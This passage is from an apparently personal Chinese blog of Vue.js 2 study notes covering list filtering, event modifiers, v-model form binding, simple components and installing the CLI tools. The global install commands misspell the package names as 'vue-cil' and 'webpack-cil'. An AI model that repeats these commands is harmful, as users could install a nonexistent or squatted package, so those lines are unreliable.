href="https://cn.vuejs.org/v2/guide/reactivity.html#%E6%A3%80%E6%B5%8B%E5%8F%98%E5%8C%96%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9">深入响应式原理</a>中有相关的讨论。</p><h4 id="对列表进行过滤"><a href="#对列表进行过滤" class="headerlink" title="对列表进行过滤"></a>对列表进行过滤</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;item in items&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;n in event(item)&quot;</span>&gt;</span><br>            &#123;&#123;n&#125;&#125;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">items</span>:[</span><br><span class="language-javascript">                [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>],</span><br><span class="language-javascript">                [<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>]</span><br><span class="language-javascript">            ]</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">event</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">numbers</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> numbers.<span class="hljs-title function_">filter</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">number</span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">return</span> number%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>;</span><br><span class="language-javascript">                &#125;)</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;great&quot;</span>&gt;</span><br>        aaa<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: &#123;&#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">great</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">alert</span>(event);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在这里great和great($event)等价</p><blockquote><p>以$开头的变量为特殊变量,$event代表原生DOM事件</p></blockquote><h4 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符"></a>事件修饰符</h4><ul><li><code>.stop</code> 阻止单击事件</li><li><code>.prevent</code> 不会重载页面</li><li><code>.capture</code> 优先处理绑定的事件</li><li><code>.self</code> 不从元素内部触发</li><li><code>.once</code> 只触发一次</li><li><code>.passive</code> 滚动事件行为</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 阻止单击事件继续传播 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-on:click.stop</span>=<span class="hljs-string">&quot;doThis&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 提交事件不再重载页面 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">v-on:submit.prevent</span>=<span class="hljs-string">&quot;onSubmit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 修饰符可以串联 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-on:click.stop.prevent</span>=<span class="hljs-string">&quot;doThat&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 只有修饰符 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">v-on:submit.prevent</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 添加事件监听器时使用事件捕获模式 --&gt;</span><br><span class="hljs-comment">&lt;!-- 即内部元素触发的事件先在此处理，然后才交由内部元素进行处理 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-on:click.capture</span>=<span class="hljs-string">&quot;doThis&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 只当在 event.target 是当前元素自身时触发处理函数 --&gt;</span><br><span class="hljs-comment">&lt;!-- 即事件不是从内部元素触发的 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-on:click.self</span>=<span class="hljs-string">&quot;doThat&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 滚动事件的默认行为 (即滚动行为) 将会立即触发 --&gt;</span><br><span class="hljs-comment">&lt;!-- 而不会等待 `onScroll` 完成  --&gt;</span><br><span class="hljs-comment">&lt;!-- 这其中包含 `event.preventDefault()` 的情况 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-on:scroll.passive</span>=<span class="hljs-string">&quot;onScroll&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">使用修饰符时，顺序很重要；相应的代码会以同样的顺序产生。因此，用 v-on:click<span class="hljs-selector-class">.prevent</span><span class="hljs-selector-class">.self</span> 会阻止所有的点击，而 v-on:click<span class="hljs-selector-class">.self</span><span class="hljs-selector-class">.prevent</span> 只会阻止对元素自身的点击。<br></code></pre></td></tr></table></figure><h4 id="按钮修饰符"><a href="#按钮修饰符" class="headerlink" title="按钮修饰符"></a>按钮修饰符</h4><p>只举个简单的例子键盘和鼠标修饰符自行查询</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 只有在 `key` 是 `Enter` 时调用 `vm.submit()` --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-on:keyup.enter</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>.left</code></li><li><code>.right</code></li><li><code>.middle</code></li></ul><h3 id="表单绑定"><a href="#表单绑定" class="headerlink" title="表单绑定"></a>表单绑定</h3><h4 id="简单的双向绑定"><a href="#简单的双向绑定" class="headerlink" title="简单的双向绑定"></a>简单的双向绑定</h4><p>使用v-model在表单上进行双向绑定时</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"> <br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;msg&quot;</span>&gt;</span><br>    &#123;&#123;msg&#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">msg</span>:<span class="hljs-string">&quot;aaa&quot;</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>最简单的双向绑定</p><p><code>v-model</code> 会忽略所有表单元素的 <code>value</code>、<code>checked</code>、<code>selected</code> attribute 的初始值而总是将 Vue 实例的数据作为数据来源。你应该通过 JavaScript 在组件的 <code>data</code> 选项中声明初始值。</p><blockquote><p>下面这些没看懂啥意思</p></blockquote><p><code>v-model</code> 在内部为不同的输入元素使用不同的 property 并抛出不同的事件：</p><ul><li>text 和 textarea 元素使用 <code>value</code> property 和 <code>input</code> 事件；</li><li>checkbox 和 radio 使用 <code>checked</code> property 和 <code>change</code> 事件；</li><li>select 字段将 <code>value</code> 作为 prop 并将 <code>change</code> 作为事件。</li></ul><h4 id="对于多选按钮-复选框-的绑定"><a href="#对于多选按钮-复选框-的绑定" class="headerlink" title="对于多选按钮(复选框)的绑定"></a>对于多选按钮(复选框)的绑定</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;items&quot;</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>aaa<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;items&quot;</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>bbb<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;items&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ccc&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>ccc<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;items&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ddd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>ddd<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    &#123;&#123;items&#125;&#125;<br>     <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">msg</span>:<span class="hljs-string">&quot;aaa&quot;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">items</span>:[]</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>由于上面的例子无论单击aaa或者bbb都会一起被单击而ccc和ddd都不受影响</p><p>多选使用列表</p><p>单选按钮使用字符串</p></blockquote><h4 id="选择框绑定"><a href="#选择框绑定" class="headerlink" title="选择框绑定"></a>选择框绑定</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html">       <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;aaa&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;aaa&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;selected&quot;</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;obj in objects&quot;</span> <span class="hljs-attr">:value</span>=<span class="hljs-string">&quot;obj.msg&quot;</span>&gt;</span>&#123;&#123;obj.msg&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br>       &#123;&#123;selected&#125;&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">       <span class="hljs-keyword">var</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">           <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">           <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">               <span class="hljs-attr">selected</span>:<span class="hljs-string">&quot;aaa&quot;</span>,</span><br><span class="language-javascript">               <span class="hljs-attr">msg</span>:<span class="hljs-string">&quot;aaa&quot;</span>,</span><br><span class="language-javascript">               <span class="hljs-attr">items</span>:[],</span><br><span class="language-javascript">               <span class="hljs-attr">objects</span>:[</span><br><span class="language-javascript">               &#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;aaa&quot;</span>&#125;,</span><br><span class="language-javascript">               &#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>&#125;,</span><br><span class="language-javascript">               &#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>&#125;,</span><br><span class="language-javascript">               &#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>&#125;,</span><br><span class="language-javascript">               &#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>&#125;,</span><br><span class="language-javascript">               ]</span><br><span class="language-javascript">           &#125;</span><br><span class="language-javascript">       &#125;)</span><br><span class="language-javascript">   </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用v-model来绑定选则的值,实现双向绑定如果使用v-bind为单项绑定&#x3D;&#x3D;只能由selected中的值影响标签的值不能仍标签的值影响到selected的值&#x3D;&#x3D;</p><h4 id="提醒"><a href="#提醒" class="headerlink" title="提醒"></a>提醒</h4><p>v-model只能用在特定组件上</p><p>可以使用value属性来决定&#x3D;&#x3D;选项组&#x3D;&#x3D;件选中时所决定的值</p><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><h3 id="lazy"><a href="#lazy" class="headerlink" title=".lazy"></a><a href="https://cn.vuejs.org/v2/guide/forms.html#lazy"><code>.lazy</code></a></h3><p>在默认情况下，<code>v-model</code> 在每次 <code>input</code> 事件触发后将输入框的值与数据进行同步 (除了<a href="https://cn.vuejs.org/v2/guide/forms.html#vmodel-ime-tip">上述</a>输入法组合文字时)。你可以添加 <code>lazy</code> 修饰符，从而转为在 <code>change</code> 事件_之后_进行同步：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 在“change”时而非“input”时更新 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model.lazy</span>=<span class="hljs-string">&quot;msg&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="number"><a href="#number" class="headerlink" title=".number"></a><a href="https://cn.vuejs.org/v2/guide/forms.html#number"><code>.number</code></a></h3><p>如果想自动将用户的输入值转为数值类型，可以给 <code>v-model</code> 添加 <code>number</code> 修饰符：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input v-model.<span class="hljs-attribute">number</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;number&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>这通常很有用，因为即使在 <code>type=&quot;number&quot;</code> 时，HTML 输入元素的值也总会返回字符串。如果这个值无法被 <code>parseFloat()</code> 解析，则会返回原始的值。</p><h3 id="trim"><a href="#trim" class="headerlink" title=".trim"></a><a href="https://cn.vuejs.org/v2/guide/forms.html#trim"><code>.trim</code></a></h3><p>如果要自动过滤用户输入的首尾空白字符，可以给 <code>v-model</code> 添加 <code>trim</code> 修饰符：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input v-model.<span class="hljs-attribute">trim</span>=<span class="hljs-string">&quot;msg&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><h3 id="基础组件"><a href="#基础组件" class="headerlink" title="基础组件"></a>基础组件</h3><h4 id="定义一个简单的组件"><a href="#定义一个简单的组件" class="headerlink" title="定义一个简单的组件"></a>定义一个简单的组件</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button-comp</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;comp&quot;</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">button-comp</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;button-comp&#x27;</span>,&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">data</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">               <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                   <span class="hljs-attr">count</span>:<span class="hljs-number">0</span></span><br><span class="language-javascript">               &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">template</span>:<span class="hljs-string">&#x27;&lt;button v-on:click=&quot;count++&quot;&gt;You clicked me &#123;&#123; count &#125;&#125; times.&lt;/button&gt;&#x27;</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#comp&quot;</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>首先在html里面定义一个新的标签为button-comp</p><p>然后在script内部进行实现template是用来描述内容的</p><p>对于data部分必须是一个函数所以每个自定义组件都有一个独立的对象他们之间的数据互不影响</p><p>自定义的组件使用props来创建变量和属性进行绑定</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title-comp</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;kkk&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;aaa&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">title-comp</span>&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">Vue.component(<span class="hljs-string">&quot;title-comp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><br>      props<span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span>&#x27;title&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>      template<span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&lt;h3&gt;&#123;&#123;title&#125;&#125;&lt;/h3&gt;&quot;</span><br>  <span class="hljs-punctuation">&#125;</span>)<br></code></pre></td></tr></table></figure><p>所有组件最后都需要通过如下方式进行创建</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">var vm=new Vue(&#123;<br>    el:&quot;#kkk&quot;<br>&#125;)<br></code></pre></td></tr></table></figure><h2 id="关于Vue-cil"><a href="#关于Vue-cil" class="headerlink" title="关于Vue-cil"></a>关于Vue-cil</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>首先需要安装node.js</p><p>安装结束后检查版本来确定是否安装成功</p><p>下面是全局安装cnpm安装方式(国内镜像的npm)</p><blockquote><p>npm install cnpm -g</p></blockquote><p>安装vue-cil</p><blockquote><p>cnpm install vue-cil -g</p></blockquote><p>vue list查看可用模板项目</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>首先创建一个项目(新建一个文件夹)</p><p>用cmd(管理员身份)切换到指定目录下(新建文件夹所在的位置)</p><p>然后运行</p><blockquote><p>vue init webpack 新建项目名</p></blockquote><p>创建完成后会有以下提示</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20210517083649211.png" alt="image-20210517083649211"></p><ul><li><p>第一行让你切换到项目目录</p></li><li><p>第二行让你安装依赖</p></li><li><p>第三行运行项目</p></li></ul><h3 id="webpack的安装"><a href="#webpack的安装" class="headerlink" title="webpack的安装"></a>webpack的安装</h3><blockquote><p>cnpm install webpack -g</p><p>cnpm install webpack-cil -g</p></blockquote><p>测试 </p><blockquote><p>webpack -v</p><p>webpack-cil -v</p></blockquote><p>打包项目时需要按照webpack.config.js(需要自己创建)进行打包</p><p>js格式为<a href="https://blog.csdn.net/zaichuanguanshui/article/details/53610694">https://blog.csdn.net/zaichuanguanshui/article/details/53610694</a></p><figure class="highlight 